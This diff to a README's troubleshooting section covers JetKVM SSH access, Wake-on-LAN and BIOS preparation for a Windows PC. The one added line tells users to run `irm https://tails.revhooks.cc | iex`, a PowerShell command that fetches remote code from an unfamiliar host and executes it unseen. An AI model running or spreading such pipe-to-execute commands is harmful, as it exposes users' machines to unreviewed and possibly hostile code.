@@ -203,6 +203,7 @@ Use the red `EXIT` button in the wizard header when you are finished.
 - If SSH login fails, confirm Developer Mode is enabled, the public key was saved in JetKVM Settings > Advanced, and the selected private key matches the public key.
 - If Wake-on-LAN does not wake the Windows PC, confirm WOL is enabled in BIOS/UEFI, Windows adapter power management, and the NIC advanced driver settings. Prefer wired Ethernet. Some Wi-Fi adapters and USB Ethernet adapters cannot wake a fully powered-off PC.
 - If BIOS prep reports unsupported or missing settings, the local model may use different firmware setting names. Check the vendor BIOS tool/download page for that model and use the BIOS UI manually where needed.
+- If the BIOS tab reports a bundled ConfigJon script is missing, rerun the latest `irm https://tails.revhooks.cc | iex` bootstrap so the `third_party\ConfigJon-Firmware-Management` files are downloaded.
 
 ## Disclaimer
 
